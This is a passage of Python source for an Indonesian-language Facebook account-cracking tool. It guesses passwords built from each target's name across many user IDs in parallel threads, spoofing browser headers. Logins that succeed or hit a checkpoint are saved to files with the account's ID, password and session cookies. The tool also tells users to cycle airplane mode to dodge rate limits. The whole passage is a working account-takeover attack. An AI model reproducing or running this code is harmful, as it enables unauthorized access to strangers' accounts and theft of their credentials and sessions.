		pwku=input(f"  {P}[{H}?{P}] Masukan password : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	met = f""" {P2}[{H2}01{P2}] Login with mbasic
 {P2}[{H2}02{P2}] Login with free facebook
 {P2}[{H2}03{P2}] Login with m.facebook --> {H2}disarankan{P2}
 {P2}[{H2}04{P2}] Login with facebook mobile"""
	Buat(Anak(met,width=80,title=f"{H2}method login{P2}",style=f"white"))
	__kon__ = input(f"   {P}[{H}?{P}] Pilih : ")
	if __kon__ in [""]:
		print(f"\n{P}[{H}!{P}] Input yang bener");setting()
	elif __kon__ in ["1", "01"]:method.append("mbasic")
	elif __kon__ in ["2", "02"]:method.append("free")
	elif __kon__ in ["3", "03"]:method.append("mobile")
	elif __kon__ in ["4", "04"]:method.append("mobile_v2")
	else:method.append('mobile')
	kunaon()


########## M FACEBOOK #########
def metodee(idf,pwv,url):
	global loop,ok,cp
	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r{bi}Atsuna1{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)} ')
	prog.advance(des)

	ses = requests.Session()

	ua1 = random.choice(ugen)
	ua = random.choice(ugan)
	jam = str(datetime.now().timestamp()).split(".")
	acc = random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"])
	for pw in pwv:
		try:
		  
		  p = ses.get(f"https://{url}.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D108569252539536%26cbt%3D1700202483739%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df935bce6a9b454%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff3a8e0c89c4078%2526relation%253Dopener%26client_id%3D108569252539536%26display%3Dtouch%26domain%3Dpicsart.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpicsart.com%252Fsso%252Fzendesk%253Fbrand_id%253D179362%2526locale_id%253D1%2526return_to%253Dhttps%25253A%25252F%25252Fsupport.picsart.com%25252Fhc%25252Fen-us%25252Fsections%25252F4416537225489-Logging-in%2526timestamp%253D1700202460%26locale%3Den_US%26logger_id%3Df3e31452a74a0c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1b5e9607a3aef8%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff3a8e0c89c4078%2526relation%253Dopener%2526frame%253Df2578adedb070c8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1b5e9607a3aef8%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff3a8e0c89c4078%26relation%3Dopener%26frame%3Df2578adedb070c8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1700202485&hrc=1&wtsid=rdr_0ChXzAy0pxf7bmf9T&_rdr")
		  dataa = {"lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1),"uid": idf,"next": f"https://{url}.facebook.com/v10.0/dialog/oauth?app_id=108569252539536&cbt=1700202483739&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df935bce6a9b454%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff3a8e0c89c4078%26relation%3Dopener&client_id=108569252539536&display=touch&domain=picsart.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fpicsart.com%2Fsso%2Fzendesk%3Fbrand_id%3D179362%26locale_id%3D1%26return_to%3Dhttps%253A%252F%252Fsupport.picsart.com%252Fhc%252Fen-us%252Fsections%252F4416537225489-Logging-in%26timestamp%3D1700202460&locale=en_US&logger_id=f3e31452a74a0c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1b5e9607a3aef8%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff3a8e0c89c4078%26relation%3Dopener%26frame%3Df2578adedb070c8&response_type=token%2Csigned_request%2Cgraph_domain&scope=email%2Cpublic_profile&sdk=joey&version=v10.0&ret=login&fbapp_pres=0&tp=unspecified","flow": "login_no_pin","pass": pw}
		  koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
		  koki+=' m_pixel_ratio=1.5; wd=360x270'
		  head = {'Host': 'm.facebook.com','content-length': '2142','sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"','sec-ch-ua-mobile': '?1','user-agent': ua,'viewport-width': '360','content-type': 'application/x-www-form-urlencoded','x-fb-lsd': re.search('name="lsd" value="([^"]+)"',str(p.text)).group(1),'sec-ch-ua-platform-version': '"7.1.1"','x-asbd-id': '129477','dpr': '1.5','sec-ch-ua-full-version-list': '"Chromium";v="116.0.5845.92", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.92"','sec-ch-ua-model': '"SM-J250F"','sec-ch-prefers-color-scheme': 'light','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=108569252539536&kid_directed_site=0&app_id=108569252539536&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D108569252539536%26cbt%3D1700239843538%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df73354d3d24aec%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff200d999496125c%2526relation%253Dopener%26client_id%3D108569252539536%26display%3Dtouch%26domain%3Dpicsart.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fpicsart.com%252Fhashtag%252Flogin%26locale%3Den_US%26logger_id%3Df16ada4abb9e99%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3bd2732b1194c%2526domain%253Dpicsart.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fpicsart.com%25252Ff200d999496125c%2526relation%253Dopener%2526frame%253Dff395391a36b98%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3bd2732b1194c%26domain%3Dpicsart.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpicsart.com%252Ff200d999496125c%26relation%3Dopener%26frame%3Dff395391a36b98%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1700240000&hrc=1&wtsid=rdr_0WaGgCIjVi0BtRmGF&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
		  po = ses.post(f"https://{url}.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=dataa,cookies={"cookie":koki},headers=head,allow_redirects=False)
		  if "checkpoint" in po.cookies.get_dict().keys():
		    tree = Tree(f"\r{K}{idf}|{pw}{P}")
		    tree.add(f"[b yellow]{ua}[white]\n")
		    Buat(tree)
		    open('CP/'+cepe,'a').write(idf+'|'+pw+'\n')
		    akun.append(idf+'|'+pw)
		    cp+=1
		    break
		  elif "c_user" in ses.cookies.get_dict().keys():
		    kuki = convert(ses.cookies.get_dict())
		    cok = (";").join([ "%s=%s" % (key, value) for key, value in po.cookies.get_dict().items() ])
		    idf = re.findall('c_user=(.*);xs', kuki)[0]
		    tree = Tree(f"\r[b green]{idf}|{pw}")
		    tree.add(f"[b green]{cok}[white]\n")
		    Buat(tree)
		    open('OK/'+okeh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
		    ok+=1
		    break
		  else:
			  continue 
		except requests.exceptions.ConnectionError:
			time.sleep(31) 
	loop+=1
	#for xx in list("\|-/"): 
		#print(f"{P}[{H}{xx}{P}] [{O}%s{P}/{O}%s{P}] = [{H}OK:%s{P}] = [{K}CP:%s{P}]"%(loop,len(id),ok,cp),end=" \r ");sys.stdout.flush()

########## PASSWORD TAMBAHAN ##########
def tampung():
  kp = f""" [[red]?[white]] Jika Result tidak ada dan mulai berat,Silahkan Aktifkan Mode Pesawat Selama 5 Detik,Dan ([green]ON[white]/[red]OF[white]) Setiap 400 Id\n {P2}[{M2}•{P2}] Akun {H2}OK{P2} save : {H2}OK/{okeh}
 {P2}[{M2}•{P2}] Akun {K2}CP{P2} save : {K2}OK/{cepe}"""
  Buat(Anak(kp,width=80,title="[green]Tutorial[white]",style=f"b white"))
def kunaon():
  global prog,des
  tampung()
  prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
  des = prog.add_task('',total=len(id))
  with prog:
    with tred(max_workers=30) as pool:
      for AangXD in id2:
        idf,nmf = AangXD.split('|')[0],AangXD.split('|')[1].lower()
        frs = nmf.split(' ')[0]
        pwv = ['jancok']
        if len(nmf)<6:
          if len(frs)<3:
            pass
          else:
            pwv.append(frs+'123')
            pwv.append(frs+'1234')
            pwv.append(frs+'12345')
            pwv.append(frs+'@')
            pwv.append(frs+'#')
        else:
          if len(frs)<3:
            pwv.append(nmf)
          else:
            pwv.append(nmf)
            pwv.append(frs+'123')
            pwv.append(frs+'1234')
            pwv.append(frs+'12345')
            pwv.append(frs+'12345@')
            pwv.append(frs+'@')
            pwv.append(frs+'#')
        if 'ya' in pwpluss:
          for xpwd in pwnya:
            pwv.append(xpwd)
        else:pass
        if 'mbasic' in method:pool.submit(metodee,idf,pwv,"mbasic")
        elif 'free' in method:pool.submit(metodee,idf,pwv,"free")
        elif 'mobile' in method:pool.submit(metodee,idf,pwv,"m")
        elif 'mobile_v2' in method:pool.submit(metodee,idf,pwv,"d")
        else:pool.submit(metode,idf,pwv,"m")
    print(f"\n")
    sel = f"""{P2}[{H2}!{P2}] Sukses crack dari {H2}{str(len(id))}{P2}
    [{O2}•{P2}] Total akun {H2}OK:{ok}{P2}
    [{O2}•{P2}] Total akun {K2}CP:{cp}{P2}"""
    Buat(Anak(sel,width=80,style=f"{B3}"))

########## CONVERT COKIES ##########
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
def __ingfo__():
	bck = f"""{P2}Saran kartu :
  └─── {H2}Axis{P2}
  └─── {H2}Telkomsel{P2}
  └─── {H2}Indosat{P2}
  └─── {H2}Three{P2}

{P2}Wifi :
  └─── {H2}Crack bisa juga menggunakan wifi, tetapi rawan spam ip karena device wifi/hotspot tidak berubah seperti data seluler

{P2}Sosial media :
  └─── {H2}FB : facebook.com/Aang.Qwerty69{P2}
  └─── {H2}GH : github.com/AngCyber{P2}
  └─── {H2}IG : instagram.com/Aangxd.Qwerty_{P2}"""
	Buat(Anak(bck,width=80,title=f"{H2}informasi{P2}",style=f"{B3}"))


if __name__=='__main__':
	
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('DATA')
	except:pass
	login()
